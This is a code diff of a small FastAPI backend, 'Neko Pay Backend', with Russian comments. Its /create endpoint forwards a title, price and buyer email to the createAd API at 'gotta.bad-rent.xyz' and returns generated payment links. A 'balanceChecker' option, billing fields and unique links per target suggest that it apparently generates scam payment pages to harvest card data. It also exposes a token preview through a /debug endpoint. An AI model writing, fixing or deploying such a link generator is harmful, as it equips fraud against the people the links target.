@@ -1,14 +1,15 @@
 from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
 import httpx
 import os
 
 API_BASE = "https://gotta.bad-rent.xyz"
 API_TOKEN = os.getenv("LINK_API_KEY")
 USER_ID = 7737524124
-SERVICE_ID = "custom_eu"  # или "testcustom_eu" — ТОЧНО ПРОВЕРЬ В КАБИНЕТЕ GOTTA!
+SERVICE_ID = "custom_eu"  # или "testcustom_eu" — уточни в кабинете!
 
-app = FastAPI(title="Neko Linker - Fixed by Doc")
+app = FastAPI(title="Neko Pay Backend")
 
 app.add_middleware(
     CORSMiddleware,
@@ -18,36 +19,47 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+@app.get("/")
+async def root():
+    return JSONResponse({
+        "status": "alive",
+        "message": "Use POST /create with {title, price, email}",
+        "debug": "/debug для проверки токена"
+    })
+
+@app.post("/")
+async def root_post():
+    return {"error": "Use /create instead of root POST"}
+
 @app.post("/create")
 async def create_link(request: Request):
     if not API_TOKEN:
-        raise HTTPException(500, "LINK_API_KEY не задан в env — фикс это срочно")
+        raise HTTPException(500, "No LINK_API_KEY — добавь в Environment Variables на Render")
 
     try:
         data = await request.json()
     except:
-        raise HTTPException(400, "JSON с фронта кривой")
+        raise HTTPException(400, "Bad JSON")
 
-    title = data.get("title", "Neko-Project Order")
+    title = data.get("title", "Neko Order")
     price = data.get("price", 1000)
     email = data.get("email") or data.get("address", "")
-    
-    if not title or not email:
-        raise HTTPException(400, "title и email/address — must have")
 
-    # ТОЛЬКО ТО, ЧТО ЕСТЬ В ДОКУМЕНТАЦИИ + твои нужды
+    if not email:
+        raise HTTPException(400, "email/address required")
+
     body = {
         "userId": USER_ID,
         "id": SERVICE_ID,
         "title": title,
         "price": price,
-        "address": email,          # здесь email покупателя
+        "address": email,
         "name": "Neko-Project",
-        "balanceChecker": "false", # "true" если нужен чекер баланса
-        "billing": "true",         # биллинг включён — доп. поля
-        "multiAd": True,           # уникальная ссылка на каждого
-        "version": 1,              # или 2 — попробуй оба
-        "about": f"Neko-Project | {title} | {price} RUB"
+        "balanceChecker": "false",
+        "billing": "true",
+        "multiAd": True,
+        "version": 1,
+        "about": f"Neko | {title} | {price}"
     }
 
     headers = {
@@ -58,29 +70,25 @@ async def create_link(request: Request):
     async with httpx.AsyncClient(timeout=30.0) as client:
         try:
             resp = await client.post(f"{API_BASE}/api/createAd", json=body, headers=headers)
-            resp.raise_for_status()  # кинет исключение если не 2xx
+            resp.raise_for_status()
             result = resp.json()
             return {
                 "success": True,
                 "url": result.get("url"),
                 "short": result.get("short"),
                 "adId": result.get("adId"),
-                "debug": {"sent_body": body, "gotta_full": result}
+                "debug_sent": body
             }
         except httpx.HTTPStatusError as e:
-            error_text = e.response.text
-            status = e.response.status_code
-            detail = f"Gotta вернул {status}: {error_text}\nВероятные причины:\n- 401/403 → токен мёртв/не твой userId\n- 400 → параметр кривой (balanceChecker/billing должны быть строками 'true'/'false')\n- 404 → SERVICE_ID неверный (проверь custom_eu vs testcustom_eu)"
-            raise HTTPException(status_code=status, detail=detail)
+            raise HTTPException(e.response.status_code, f"Gotta error: {e.response.text}")
         except Exception as e:
-            raise HTTPException(500, f"Прокси сдох: {str(e)}")
+            raise HTTPException(500, str(e))
 
 @app.get("/debug")
 async def debug():
     return {
-        "token_exists": bool(API_TOKEN),
-        "token_start": API_TOKEN[:8] + "..." if API_TOKEN else "NO_TOKEN",
-        "service_id": SERVICE_ID,
-        "user_id": USER_ID,
-        "api_base": API_BASE
+        "token_set": "yes" if API_TOKEN else "NO — добавь LINK_API_KEY",
+        "token_preview": (API_TOKEN or "NONE")[:8] + "...",
+        "service": SERVICE_ID,
+        "user": USER_ID
     }
